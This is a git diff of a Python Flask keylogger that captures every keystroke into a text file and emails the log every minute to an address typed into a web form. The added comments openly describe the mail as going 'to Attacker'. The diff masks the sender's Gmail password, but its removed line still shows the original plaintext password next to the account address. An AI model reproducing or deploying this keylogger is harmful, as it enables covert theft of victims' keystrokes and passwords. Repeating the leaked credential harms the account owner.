@@ -7,13 +7,14 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import threading
 app = Flask(__name__)
-def send_file(userEmail):
-    threading.Timer(60,send_file,[userEmail]).start()
+def send_file(userEmail): # Sending keylogs through Email to Attacker
+    threading.Timer(60,send_file,[userEmail]).start() # Sending email to attacker after every minute
+    # Creating Email with Attachment
     subject = "KeyLocker"
     body = "This email containing confedential file please don't share this with anyone"
     sender_email = "samsamirtgm@gmail.com"
     receiver_email = userEmail
-    password = "1allahakbar#"
+    password = "*********"
 
     # Create a multipart message and set headers
     message = MIMEMultipart()
@@ -58,8 +59,8 @@ def send_file(userEmail):
 def home():
     if request.method == 'POST':
         userEmail = request.form.get("email")
-        send_file(userEmail)
-        def key_stroke(key):
+        send_file(userEmail) # Call to send email
+        def key_stroke(key): # Main function
             key = str(key).replace("'","")
             if key == 'Key.space':
                 key = ' '
@@ -79,10 +80,10 @@ def home():
                 key = "" 
             else:
                 pass    
-            filename = "keylogger"+".txt"      
-            with open(filename,"a") as file:
+            filename = "keylogger"+".txt"       
+            with open(filename,"a") as file: # Writing key logs on text file
                 file.write(key)       
-        with Listener(on_press=key_stroke) as listen:
+        with Listener(on_press=key_stroke) as listen: # Checking for every event on keyboard
             listen.join()     
     return render_template("index.html")
 
